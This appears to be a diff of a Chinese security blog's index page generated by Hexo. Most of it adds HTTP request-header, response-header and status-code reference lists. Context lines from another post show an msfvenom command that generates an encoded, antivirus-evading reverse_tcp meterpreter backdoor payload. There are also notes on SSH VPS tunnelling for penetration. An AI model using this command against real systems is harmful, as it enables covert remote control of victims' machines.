@@ -84,8 +84,9 @@
     
     <div class="article-entry" itemprop="articleBody">
       
+<!-- Table of Contents -->
+
         <p>​                                                                                                                                                                                                                         </p>
-<p>[TOC]</p>
 <h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a>1.基础知识</h2><h3 id="1-1-Web发展简史"><a href="#1-1-Web发展简史" class="headerlink" title="1.1.Web发展简史"></a>1.1.Web发展简史</h3><h4 id="1-1-1-静态页面"><a href="#1-1-1-静态页面" class="headerlink" title="1.1.1.静态页面"></a>1.1.1.静态页面</h4><p>在最开始的时候，网站的主要内容是静态的，由文字和图片组成，制作形式也是以表格为主。当时的用户行为也非常简单，仅仅是浏览网页。</p>
 <h4 id="1-1-2-多媒体阶段"><a href="#1-1-2-多媒体阶段" class="headerlink" title="1.1.2.多媒体阶段"></a>1.1.2.多媒体阶段</h4><p>随着技术的不断发展，音频、视频、flash等多媒体诞生了。多媒体的加入使得网页变得更加生动形象，网页上的交互也给用户带来了很好的体验。</p>
 <h4 id="1-1-3-CGI阶段"><a href="#1-1-3-CGI阶段" class="headerlink" title="1.1.3.CGI阶段"></a>1.1.3.CGI阶段</h4><p>渐渐的，多媒体已经不能满足人们的请求，于是CGI (Common Gateway Interface) 应运而生。CGI定义了Web服务器与外部应用程序之间的通信接口标准，因此Web服务器可以通过CGI执行外部程序，让外部程序根据Web请求内容生成动态的内容。</p>
@@ -188,11 +189,585 @@
 </ul>
 </li>
 </ul>
-<h4 id="1-4-2-请求头列表"><a href="#1-4-2-请求头列表" class="headerlink" title="1.4.2.请求头列表"></a>1.4.2.请求头列表</h4><h4 id="1-4-3-响应头列表"><a href="#1-4-3-响应头列表" class="headerlink" title="1.4.3.响应头列表"></a>1.4.3.响应头列表</h4><h4 id="1-4-4-HTTP状态返回代码1xx-临时响应"><a href="#1-4-4-HTTP状态返回代码1xx-临时响应" class="headerlink" title="1.4.4.HTTP状态返回代码1xx (临时响应)"></a>1.4.4.HTTP状态返回代码1xx (临时响应)</h4><h4 id="1-4-5-HTTP状态返回代码2xx-成功"><a href="#1-4-5-HTTP状态返回代码2xx-成功" class="headerlink" title="1.4.5.HTTP状态返回代码2xx (成功)"></a>1.4.5.HTTP状态返回代码2xx (成功)</h4><h4 id="1-4-6-HTTP状态返回代码3xx-重定向"><a href="#1-4-6-HTTP状态返回代码3xx-重定向" class="headerlink" title="1.4.6.HTTP状态返回代码3xx (重定向)"></a>1.4.6.HTTP状态返回代码3xx (重定向)</h4><h4 id="1-4-7-HTTP状态返回代码4xx-请求错误"><a href="#1-4-7-HTTP状态返回代码4xx-请求错误" class="headerlink" title="1.4.7.HTTP状态返回代码4xx (请求错误)"></a>1.4.7.HTTP状态返回代码4xx (请求错误)</h4><h4 id="1-4-8-HTTP状态返回代码5xx-服务器错误"><a href="#1-4-8-HTTP状态返回代码5xx-服务器错误" class="headerlink" title="1.4.8.HTTP状态返回代码5xx (服务器错误)"></a>1.4.8.HTTP状态返回代码5xx (服务器错误)</h4>
+<h4 id="1-4-2-请求头列表"><a href="#1-4-2-请求头列表" class="headerlink" title="1.4.2.请求头列表"></a>1.4.2.请求头列表</h4><ul>
+<li><strong>Accept</strong><ol>
+<li>指定客户端能够接收的内容类型</li>
+<li>Accept：text/plain，text/html</li>
+</ol>
+</li>
+<li><strong>Accept-Charset</strong><ol>
+<li>浏览器可以接受的字符编码集</li>
+<li>Accept-Charset：iso-8859-5</li>
+</ol>
+</li>
+<li><strong>Accept-Encoding</strong><ol>
+<li>指定浏览器可以支持的web服务器返回内容压缩编码类型</li>
+<li>Accept-Encoding：compress，gzip</li>
+</ol>
+</li>
+<li><strong>Accept-Language</strong><ol>
+<li>浏览器可接受的语言</li>
+<li>Accept-Language：en,zh</li>
+</ol>
+</li>
+<li><strong>Accept-Ranges</strong><ol>
+<li>可以请求网页实体的一个或者多个子范围字段</li>
+<li>Accept-Ranges：bytes</li>
+</ol>
+</li>
+<li><strong>Authorization</strong><ol>
+<li>HTTP授权的授权证书</li>
+<li>Authorization：Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</li>
+</ol>
+</li>
+<li><strong>Cache-Control</strong><ol>
+<li>指定请求和响应遵循的缓存机制 Cache-Control：no-cache</li>
+</ol>
+</li>
+<li><strong>Connection</strong><ol>
+<li>表示是否需要持久连接 // HTTP 1.1默认进行持久连接</li>
+<li>Connection：close</li>
+</ol>
+</li>
+<li><strong>Cookie</strong><ol>
+<li>HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器</li>
+<li>Cookie：role=admin;ssid=1</li>
+</ol>
+</li>
+<li><strong>Content-Length</strong><ol>
+<li>请求的内容长度</li>
+<li>Content-Length：348</li>
+</ol>
+</li>
+<li><strong>Conternt-Type</strong><ol>
+<li>请求的与实体对应的MIME信息</li>
+<li>Content-Type：application/x-www-form-urlencoded</li>
+</ol>
+</li>
+<li><strong>Date</strong><ol>
+<li>请求发送的日期和时间</li>
+<li>Date: Tue, 15 Nov 2019 08:12:31 GMT</li>
+</ol>
+</li>
+<li><strong>Expect</strong><ol>
+<li>请求的特定的服务器行为</li>
+<li>Expect: 100-continue</li>
+</ol>
+</li>
+<li><strong>From</strong><ol>
+<li>发出请求的用户的Email</li>
+<li>From: <a href="mailto:user%40email.com" target="_blank" rel="noopener">user@email.com</a></li>
+</ol>
+</li>
+<li><strong>Host</strong><ol>
+<li>指定请求的服务器的域名和端口号</li>
+<li>Host: <a href="http://www.github.com" target="_blank" rel="noopener">www.github.com</a></li>
+</ol>
+</li>
+<li><strong>If-Match</strong><ol>
+<li>只有请求内容与实体相匹配才有效</li>
+<li>If-Match: “737060cd8c284d8af7ad3082f209582d”</li>
+</ol>
+</li>
+<li><strong>If-Modified-Since</strong><ol>
+<li>如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码</li>
+<li>If-Modified-Since: Sat, 29 Oct 2019 19:43:31 GMT</li>
+</ol>
+</li>
+<li><strong>If-None-Match</strong><ol>
+<li>如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变</li>
+<li>If-None-Match: “737060cd8c284d8af7ad3082f209582d”</li>
+</ol>
+</li>
+<li><strong>If-Range</strong><ol>
+<li>如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag</li>
+<li>If-Range: “737060cd8c284d8af7ad3082f209582d”</li>
+</ol>
+</li>
+<li><strong>If-Unmodified-Since</strong><ol>
+<li>只在实体在指定时间之后未被修改才请求成功</li>
+<li>If-Unmodified-Since: Sat, 29 Oct 2019 19:43:31 GMT</li>
+</ol>
+</li>
+<li><strong>Max-Forwards</strong><ol>
+<li>限制信息通过代理和网关传送的时间</li>
+<li>Max-Forwards: 10</li>
+</ol>
+</li>
+<li><strong>Pragma</strong><ol>
+<li>用来包含实现特定的指令</li>
+<li>Pragma: no-cache</li>
+</ol>
+</li>
+<li><strong>Proxy-Authorization</strong><ol>
+<li>连接到代理的授权证书</li>
+<li>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</li>
+</ol>
+</li>
+<li><strong>Range</strong><ol>
+<li>只请求实体的一部分，指定范围</li>
+<li>Range: bytes=500-999</li>
+</ol>
+</li>
+<li><strong>Referer</strong><ol>
+<li>先前网页的地址，当前请求网页紧随其后,即来路</li>
+<li>Referer：<a href="https://405337564.github.io/" target="_blank" rel="noopener">https://405337564.github.io/</a></li>
+</ol>
+</li>
+<li><strong>TE</strong><ol>
+<li>客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</li>
+<li>TE: trailers,deflate;q=0.5</li>
+</ol>
+</li>
+<li><strong>Upgrade</strong><ol>
+<li>向服务器指定某种传输协议以便服务器进行转换（如果支持）</li>
+<li>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</li>
+</ol>
+</li>
+<li><strong>User-Agent</strong><ol>
+<li>User-Agent的内容包含发出请求的用户信息</li>
+<li>User-Agent: Mozilla/5.0 (Linux; X11)</li>
+</ol>
+</li>
+<li><strong>Via</strong><ol>
+<li>通知中间网关或代理服务器地址，通信协议</li>
+<li>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</li>
+</ol>
+</li>
+<li><strong>Waring</strong><ol>
+<li>关于消息实体的警告信息</li>
+<li>Warn: 199 Miscellaneous warning</li>
+</ol>
+</li>
+</ul>
+<h4 id="1-4-3-响应头列表"><a href="#1-4-3-响应头列表" class="headerlink" title="1.4.3.响应头列表"></a>1.4.3.响应头列表</h4><ul>
+<li><p><strong>Accept-Ranges</strong></p>
+<ol>
+<li>表明服务器是否支持指定范围请求及哪种类型的分段请求</li>
+</ol>
+<p>​            b. Accept-Ranges: bytes</p>
+</li>
+<li><p><strong>Age</strong></p>
+<ol>
+<li>从原始服务器到代理缓存形成的估算时间（以秒计，非负）</li>
+</ol>
+<p>​            b. Age: 12</p>
+</li>
+<li><p><strong>Allow</strong></p>
+<ol>
+<li>对某网络资源的有效的请求行为，不允许则返回405</li>
+<li>Allow: GET, HEAD</li>
+</ol>
+</li>
+<li><p><strong>Cache-Control</strong></p>
+<ol>
+<li>告诉所有的缓存机制是否可以缓存及哪种类型</li>
+<li>Cache-Control: no-cache</li>
+</ol>
+</li>
+<li><p><strong>Content-Encoding</strong></p>
+<ol>
+<li>web服务器支持的返回内容压缩编码类型。</li>
+<li>Content-Encoding: gzip</li>
+</ol>
+</li>
+<li><p><strong>Content-Language</strong></p>
+<ol>
+<li>响应体的语言</li>
+<li>Content-Language: en,zh</li>
+</ol>
+</li>
+<li><p><strong>Content-Length</strong></p>
+<ol>
+<li>响应体的长度</li>
+<li>Content-Length: 348</li>
+</ol>
+</li>
+<li><p><strong>Content-Location</strong></p>
+<ol>
+<li>请求资源可替代的备用的另一地址</li>
+<li>Content-Location: /index.htm</li>
+</ol>
+</li>
+<li><p><strong>Content-MD5</strong></p>
+<ol>
+<li>返回资源的MD5校验值</li>
+<li>Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==</li>
+</ol>
+</li>
+<li><p><strong>Content-Range</strong></p>
+<ol>
+<li>在整个返回体中本部分的字节位置</li>
+<li>Content-Range: bytes 21010-47021/47022</li>
+</ol>
+</li>
+<li><p><strong>Content-Type</strong></p>
+<ol>
+<li>返回内容的MIME类型</li>
+<li>Content-Type: text/html; charset=utf-8</li>
+</ol>
+</li>
+<li><p><strong>Date</strong></p>
+<ol>
+<li>原始服务器消息发出的时间</li>
+<li>Date: Tue, 15 Nov 2010 08:12:31 GMT</li>
+</ol>
+</li>
+<li><p><strong>ETag</strong></p>
+<ol>
+<li>请求变量的实体标签的当前值</li>
+<li>ETag: “737060cd8c284d8af7ad3082f209582d”</li>
+</ol>
+</li>
+<li><p><strong>Expires</strong></p>
+<ol>
+<li>响应过期的日期和时间</li>
+<li>Expires: Thu, 01 Dec 2010 16:00:00 GMT</li>
+</ol>
+</li>
+<li><p><strong>Last-Modified</strong></p>
+<ol>
+<li>请求资源的最后修改时间</li>
+<li>Last-Modified: Tue, 15 Nov 2010 12:45:26 GMT</li>
+</ol>
+</li>
+<li><p><strong>Location</strong></p>
+<ol>
+<li>用来重定向接收方到非请求URL的位置来完成请求或标识新的资源</li>
+<li>Location: <a href="http://www.zcmhi.com/archives/94.html" target="_blank" rel="noopener">http://www.zcmhi.com/archives/94.html</a></li>
+</ol>
+</li>
+<li><p><strong>Pragma</strong></p>
+<ol>
+<li>包括实现特定的指令，它可应用到响应链上的任何接收方</li>
+<li>Pragma: no-cache</li>
+</ol>
+</li>
+<li><p><strong>Proxy-Authenticate</strong></p>
+<ol>
+<li>它指出认证方案和可应用到代理的该URL上的参数</li>
+<li>Proxy-Authenticate: Basic</li>
+</ol>
+</li>
+<li><p><strong>Refresh</strong></p>
+<ol>
+<li>应用于重定向或一个新的资源被创造，在5秒之后重定向（由网景提出，被大部分浏览器支持）</li>
+<li>Refresh: 5; url=<a href="http://www.zcmhi.com/archives/94.html" target="_blank" rel="noopener">http://www.zcmhi.com/archives/94.html</a></li>
+</ol>
+</li>
+<li><p><strong>Retry-After</strong></p>
+<ol>
+<li>如果实体暂时不可取，通知客户端在指定时间之后再次尝试</li>
+<li>Retry-After: 120</li>
+</ol>
+</li>
+<li><p><strong>Server</strong></p>
+<ol>
+<li>web服务器软件名称</li>
+<li>Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)</li>
+</ol>
+</li>
+<li><p><strong>Set-Cookie</strong></p>
+<ol>
+<li>设置Http Cookie Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1</li>
+</ol>
+</li>
+<li><p><strong>Trailer</strong></p>
+<ol>
+<li>指出头域在分块传输编码的尾部存在 Trailer: Max-Forwards</li>
+</ol>
+</li>
+<li><p><strong>Transfer-Encoding</strong></p>
+<ol>
+<li>文件传输编码</li>
+<li>Transfer-Encoding:chunked</li>
+</ol>
+</li>
+<li><p><strong>Vary</strong></p>
+<ol>
+<li>告诉下游代理是使用缓存响应还是从原始服务器请求</li>
+<li>Vary: *</li>
+</ol>
+</li>
+<li><p><strong>Via</strong></p>
+<ol>
+<li>告知代理客户端响应是通过哪里发送的</li>
+<li>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</li>
+</ol>
+</li>
+<li><p><strong>Warning</strong></p>
+<ol>
+<li>警告实体可能存在的问题</li>
+<li>Warning: 199 Miscellaneous warning</li>
+</ol>
+</li>
+<li><p><strong>WWW-Authenticate</strong></p>
+<ol>
+<li>表明客户端请求实体应该使用的授权方案</li>
+<li>WWW-Authenticate: Basic</li>
+</ol>
+</li>
+</ul>
+<h4 id="1-4-4-HTTP状态返回代码1xx-临时响应"><a href="#1-4-4-HTTP状态返回代码1xx-临时响应" class="headerlink" title="1.4.4.HTTP状态返回代码1xx (临时响应)"></a>1.4.4.HTTP状态返回代码1xx (临时响应)</h4><p>表示临时响应并需要请求者继续执行操作的状态代码。</p>
+<table>
+<thead>
+<tr>
+<th>Code</th>
+<th>代码</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>100</td>
+<td>继续</td>
+<td>服务器返回此代码表示已收到请求的第一部分，正在等待其余部分</td>
+</tr>
+<tr>
+<td>101</td>
+<td>切换协议</td>
+<td>请求者已要求服务器切换协议，服务器已确认并准备切换</td>
+</tr>
+</tbody>
+</table>
+<h4 id="1-4-5-HTTP状态返回代码2xx-成功"><a href="#1-4-5-HTTP状态返回代码2xx-成功" class="headerlink" title="1.4.5.HTTP状态返回代码2xx (成功)"></a>1.4.5.HTTP状态返回代码2xx (成功)</h4><p>表示成功处理了请求的状态代码。</p>
+<table>
+<thead>
+<tr>
+<th>Code</th>
+<th>代码</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>200</td>
+<td>成功</td>
+<td>服务器已成功处理了请求。 通常，这表示服务器提供了请求的网页</td>
+</tr>
+<tr>
+<td>201</td>
+<td>已创建</td>
+<td>请求成功并且服务器创建了新的资源</td>
+</tr>
+<tr>
+<td>202</td>
+<td>已接受</td>
+<td>服务器已接受请求，但尚未处理</td>
+</tr>
+<tr>
+<td>203</td>
+<td>非授权信息</td>
+<td>服务器已成功处理了请求，但返回的信息可能来自另一来源</td>
+</tr>
+<tr>
+<td>204</td>
+<td>无内容</td>
+<td>服务器成功处理了请求，但没有返回任何内容</td>
+</tr>
+<tr>
+<td>205</td>
+<td>重置内容</td>
+<td>m服务器成功处理了请求，但没有返回任何内容</td>
+</tr>
+<tr>
+<td>206</td>
+<td>部分内容</td>
+<td>服务器成功处理了部分GET请求</td>
+</tr>
+</tbody>
+</table>
+<h4 id="1-4-6-HTTP状态返回代码3xx-重定向"><a href="#1-4-6-HTTP状态返回代码3xx-重定向" class="headerlink" title="1.4.6.HTTP状态返回代码3xx (重定向)"></a>1.4.6.HTTP状态返回代码3xx (重定向)</h4><p>表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。</p>
+<table>
+<thead>
+<tr>
+<th>Code</th>
+<th>代码</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>300</td>
+<td>多种选择</td>
+<td>针对请求，服务器可执行多种操作。 服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。</td>
+</tr>
+<tr>
+<td>301</td>
+<td>永久移动</td>
+<td>请求的网页已永久移动到新位置。 服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。</td>
+</tr>
+<tr>
+<td>302</td>
+<td>临时移动</td>
+<td>服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。</td>
+</tr>
+<tr>
+<td>303</td>
+<td>查看其他位置</td>
+<td>请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。</td>
+</tr>
+<tr>
+<td>304</td>
+<td>未修改</td>
+<td>自从上次请求后，请求的网页未修改过。 服务器返回此响应时，不会返回网页内容。</td>
+</tr>
+<tr>
+<td>305</td>
+<td>使用代理</td>
+<td>请求者只能使用代理访问请求的网页。如果服务器返回此响应，还表示请求者应使用代理。</td>
+</tr>
+<tr>
+<td>307</td>
+<td>临时重定向</td>
+<td>服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。</td>
+</tr>
+</tbody>
+</table>
+<h4 id="1-4-7-HTTP状态返回代码4xx-请求错误"><a href="#1-4-7-HTTP状态返回代码4xx-请求错误" class="headerlink" title="1.4.7.HTTP状态返回代码4xx (请求错误)"></a>1.4.7.HTTP状态返回代码4xx (请求错误)</h4><p>这些状态代码表示请求可能出错，妨碍了服务器的处理。</p>
+<table>
+<thead>
+<tr>
+<th>Code</th>
+<th>代码</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>400</td>
+<td>错误请求</td>
+<td>服务器不理解请求的语法。</td>
+</tr>
+<tr>
+<td>401</td>
+<td>未授权</td>
+<td>请求要求身份验证。对于需要登录的网页，服务器可能返回此响应。</td>
+</tr>
+<tr>
+<td>403</td>
+<td>禁止</td>
+<td>服务器拒绝请求。</td>
+</tr>
+<tr>
+<td>404</td>
+<td>未找到</td>
+<td>服务器找不到请求的网页。</td>
+</tr>
+<tr>
+<td>405</td>
+<td>方法禁用</td>
+<td>禁用请求中指定的方法。</td>
+</tr>
+<tr>
+<td>406</td>
+<td>不接受</td>
+<td>无法使用请求的内容特性响应请求的网页。</td>
+</tr>
+<tr>
+<td>407</td>
+<td>需要代理授权</td>
+<td>此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。</td>
+</tr>
+<tr>
+<td>408</td>
+<td>请求超时</td>
+<td>服务器等候请求时发生超时。</td>
+</tr>
+<tr>
+<td>409</td>
+<td>冲突</td>
+<td>服务器在完成请求时发生冲突。 服务器必须在响应中包含有关冲突的信息。</td>
+</tr>
+<tr>
+<td>410</td>
+<td>已删除</td>
+<td>如果请求的资源已永久删除，服务器就会返回此响应。</td>
+</tr>
+<tr>
+<td>411</td>
+<td>需要有效长度</td>
+<td>服务器不接受不含有效内容长度标头字段的请求。</td>
+</tr>
+<tr>
+<td>412</td>
+<td>未满足前提条件</td>
+<td>服务器未满足请求者在请求中设置的其中一个前提条件。</td>
+</tr>
+<tr>
+<td>413</td>
+<td>请求实体过大</td>
+<td>服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。</td>
+</tr>
+<tr>
+<td>414</td>
+<td>请求的 URI 过长</td>
+<td>请求的 URI（通常为网址）过长，服务器无法处理。</td>
+</tr>
+<tr>
+<td>415</td>
+<td>不支持的媒体类型</td>
+<td>请求的格式不受请求页面的支持。</td>
+</tr>
+<tr>
+<td>416</td>
+<td>请求范围不符合要求</td>
+<td>如果页面无法提供请求的范围，则服务器会返回此状态代码。</td>
+</tr>
+<tr>
+<td>417</td>
+<td>未满足期望值</td>
+<td>服务器未满足”期望”请求标头字段的要求。</td>
+</tr>
+</tbody>
+</table>
+<h4 id="1-4-8-HTTP状态返回代码5xx-服务器错误"><a href="#1-4-8-HTTP状态返回代码5xx-服务器错误" class="headerlink" title="1.4.8.HTTP状态返回代码5xx (服务器错误)"></a>1.4.8.HTTP状态返回代码5xx (服务器错误)</h4><p>这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。</p>
+<table>
+<thead>
+<tr>
+<th>Code</th>
+<th>代码</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>500</td>
+<td>服务器内部错误</td>
+<td>服务器遇到错误，无法完成请求。</td>
+</tr>
+<tr>
+<td>501</td>
+<td>尚未实施</td>
+<td>服务器不具备完成请求的功能。例如，服务器无法识别请求方法时可能会返回此代码。</td>
+</tr>
+<tr>
+<td>502</td>
+<td>错误网关</td>
+<td>服务器作为网关或代理，从上游服务器收到无效响应。</td>
+</tr>
+<tr>
+<td>503</td>
+<td>服务不可用</td>
+<td>服务器目前无法使用（由于超载或停机维护）。 通常，这只是暂时状态。</td>
+</tr>
+<tr>
+<td>504</td>
+<td>网关超时</td>
+<td>服务器作为网关或代理，但是没有及时从上游服务器收到请求。</td>
+</tr>
+<tr>
+<td>505</td>
+<td>HTTP 版本不受支持</td>
+<td>服务器不支持请求中所用的 HTTP 协议版本。</td>
+</tr>
+</tbody>
+</table>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/03/31/web安全学习笔记/" data-id="cjtwt3u5j0002lcv63t64zrwt" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/03/31/web安全学习笔记/" data-id="cjtx691tj0000ccv6ncrdg0k9" class="article-share-link">Share</a>
       
       
     </footer>
@@ -224,6 +799,8 @@
     
     <div class="article-entry" itemprop="articleBody">
       
+<!-- Table of Contents -->
+
         <p><strong>Windows</strong></p>
 <p>①首先需要配置vps的ssh服务</p>
 <p>编辑：<code>vi /etc/ssh/sshd_config</code></p>
@@ -257,7 +834,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/02/12/ssh-vps实现外网渗透/" data-id="cjtwt3u5b0001lcv6tc2j32ss" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/02/12/ssh-vps实现外网渗透/" data-id="cjtx641d90000kov6scnro7qz" class="article-share-link">Share</a>
       
       
     </footer>
@@ -289,12 +866,14 @@
     
     <div class="article-entry" itemprop="articleBody">
       
+<!-- Table of Contents -->
+
         <p>笨蛋自以为聪明，聪明人才知道自己是笨蛋。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/02/01/hello-world/" data-id="cjtwt3u520000lcv624wu2eps" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/02/01/hello-world/" data-id="cjtx641fg0001kov6zvtbhy7i" class="article-share-link">Share</a>
       
       
     </footer>
@@ -326,6 +905,8 @@
     
     <div class="article-entry" itemprop="articleBody">
       
+<!-- Table of Contents -->
+
         <p>①在kali中生成shellcode免杀</p>
 <p><code>msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ lhost=192.168.0.124 lport=5555 -f c -o /home/test.c</code></p>
 <p><img src="/2019/02/01/利用metasploit生成免杀后门/kali.PNG" alt=""></p>
@@ -471,7 +1052,7 @@ __asm
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/02/01/利用metasploit生成免杀后门/" data-id="cjtwt3u5k0003lcv60k4k81x4" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2019/02/01/利用metasploit生成免杀后门/" data-id="cjtx641hg0002kov649amo0y6" class="article-share-link">Share</a>
       
       
     </footer>
